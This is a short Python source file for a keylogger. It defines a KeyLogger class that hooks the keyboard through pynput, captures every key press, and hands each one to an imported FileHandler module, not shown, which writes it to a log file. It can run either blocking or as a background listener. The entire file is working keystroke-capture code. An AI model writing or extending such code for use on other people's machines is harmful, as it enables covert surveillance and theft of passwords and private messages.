from pynput.keyboard import Key, Listener
from file_handler import FileHandler

class KeyLogger:
    def __init__(self, filename, seconds_per_log) -> None:
        self.fileHandler = FileHandler(filename=filename, timer_count=seconds_per_log)

    def __on_press(self, key) -> None:
        self.fileHandler.print_key_to_file(key)

    def start_listener(self) -> None:
        with Listener(on_press=self.__on_press) as listener:
            listener.join()

    def start_listener_async(self) -> None:
        listener = Listener(on_press=self.__on_press)
        listener.start()